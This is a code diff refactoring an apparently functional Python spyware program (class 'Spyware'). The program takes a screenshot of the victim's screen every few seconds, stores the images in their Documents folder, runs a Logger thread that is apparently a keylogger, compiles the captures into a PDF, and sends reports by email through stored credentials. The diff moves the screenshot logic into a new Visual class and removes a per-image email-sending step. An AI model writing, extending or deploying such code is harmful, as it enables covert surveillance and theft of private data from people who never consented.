@@ -18,7 +18,6 @@ from modules.send_email import send_mail
 
 class Spyware:
     def __init__(self):
-        self.screenshot_state = True
         self.screenshot_period = 5
 
         with open('./user_info/info.json') as input_file:
@@ -32,6 +31,38 @@ class Spyware:
         except:
             error_msg = 'Could not send that'
             send_mail(self.user_info.email, self.user_info.password, error_msg, 'Spyware report', file_path)
+
+    def start(self):
+        user_path = os.path.expanduser('~\\documents')
+        logger = Logger()
+        visual = Visual(self.screenshot_period)
+
+        if not os.path.isdir(f'{user_path}\\images_record'):
+            os.mkdir(f'{user_path}\\images_record')
+
+        async_tasks = [Thread(target=visual.make_screenshot, daemon=True), Thread(target=logger.init, daemon=True)]
+        [t.start() for t in async_tasks]
+
+        while True:
+            que = input('')
+
+            if que == 'k':
+                visual.change_state()
+                visual.make_pdf()
+                break
+            else:
+                print('\n')
+        [t.join() for t in async_tasks]
+
+
+class Visual:
+    def __init__(self, screenshot_period):
+        self.screenshot_state = True
+        self.screenshot_period = screenshot_period
+
+    def change_state(self):
+        self.screenshot_state = not self.screenshot_state
+
 
     def make_pdf(self):
         user_path = os.path.expanduser('~\\documents')
@@ -64,39 +95,8 @@ class Spyware:
             sleep(self.screenshot_period)
 
             im = ImageGrab.grab()
-            try:
-                im.save(f'{user_path}\\images_record\\image{counter}.png')
+            im.save(f'{user_path}\\images_record\\image{counter}.png')
 
-                report_thread = Thread(target=partial(self.send_report, f'{user_path}\\images_record\\image{counter}.png'),
-                                    daemon=True)
-                report_thread.start()
-
-                report_thread.join()
-
-            except:
-                pass
-
-    def start(self):
-        user_path = os.path.expanduser('~\\documents')
-        logger = Logger()
-
-        if not os.path.isdir(f'{user_path}\\images_record'):
-            os.mkdir(f'{user_path}\\images_record')
-
-
-        async_tasks = [Thread(target=self.make_screenshot, daemon=True), Thread(target=logger.init, daemon=True)]
-        [t.start() for t in async_tasks]
-
-        while True:
-            que = input('')
-
-            if que == 'k':
-                self.screenshot_state = False
-                self.make_pdf()
-                break
-            else:
-                print('\n')
-        [t.join() for t in async_tasks]
 
 
 if __name__ == '__main__':
